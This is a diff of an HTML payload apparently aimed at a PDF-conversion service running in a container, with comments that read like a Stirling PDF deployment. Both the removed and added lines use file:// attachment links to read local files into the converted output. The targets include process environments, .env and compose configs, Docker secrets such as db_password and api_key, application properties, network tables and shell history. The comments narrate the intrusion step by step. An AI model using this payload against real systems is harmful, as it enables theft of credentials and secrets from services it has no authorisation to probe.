@@ -6,35 +6,41 @@
     <title>Document</title>
 </head>
 <body>
-<!-- Mounted configs directory (HOST FILESYSTEM ACCESS!) -->
-<link rel="attachment" href="file:///configs/">
-<link rel="attachment" href="file:///configs/docker-compose.yml">
-<link rel="attachment" href="file:///configs/.env">
-<link rel="attachment" href="file:///configs/settings.yml">
+<!-- Parent process (PID 9 - likely the Java application) -->
+<link rel="attachment" href="file:///proc/9/environ">
+<link rel="attachment" href="file:///proc/9/cmdline">
+<link rel="attachment" href="file:///proc/9/status">
 
-<!-- Since /etc files are bind-mounted from host, try to traverse -->
-<link rel="attachment" href="file:///etc/../home/">
-<link rel="attachment" href="file:///etc/../root/.bash_history">
-
-<!-- Docker overlay filesystem (might contain other containers' data) -->
-<link rel="attachment" href="file:///var/lib/docker/overlay2/22954df52c160bc411c2d2939d57b92e49891985246b762289c9b6b86e52382a/diff/">
-
-<!-- World-readable system files -->
-<link rel="attachment" href="file:///etc/crontab">
-<link rel="attachment" href="file:///etc/os-release">
+<!-- Init process in container -->
 <link rel="attachment" href="file:///proc/1/environ">
 <link rel="attachment" href="file:///proc/1/cmdline">
 
-<!-- Check for other running processes -->
-<link rel="attachment" href="file:///proc/1/status">
-<link rel="attachment" href="file:///proc/9/environ">
-<link rel="attachment" href="file:///proc/9/cmdline">
+<!-- Process memory maps (reveals loaded files and paths) -->
+<link rel="attachment" href="file:///proc/self/maps">
+<link rel="attachment" href="file:///proc/9/maps">
 
-<!-- Tessdata directory (mounted from host) -->
-<link rel="attachment" href="file:///usr/share/tessdata/">
+<!-- Additional configs from mounted directory -->
+<link rel="attachment" href="file:///configs/docker-compose.yml">
+<link rel="attachment" href="file:///configs/.env">
+<link rel="attachment" href="file:///configs/application.yml">
 
-<!-- Temporary files (accessible with UID 1000) -->
-<link rel="attachment" href="file:///tmp/">
-<link rel="attachment" href="file:///home/stirlingpdfuser/">
+<!-- Network info -->
+<link rel="attachment" href="file:///etc/resolv.conf">
+<link rel="attachment" href="file:///proc/net/tcp">
+<link rel="attachment" href="file:///proc/net/udp">
+
+<!-- Cgroup info (container orchestration details) -->
+<link rel="attachment" href="file:///proc/self/cgroup">
+
+<!-- Check for Docker secrets -->
+<link rel="attachment" href="file:///run/secrets/db_password">
+<link rel="attachment" href="file:///run/secrets/api_key">
+
+<!-- Application working directory -->
+<link rel="attachment" href="file:///usr/src/app/.env">
+<link rel="attachment" href="file:///usr/src/app/application.properties">
+
+<!-- User bash history -->
+<link rel="attachment" href="file:///home/stirlingpdfuser/.bash_history">
 </body>
 </html>
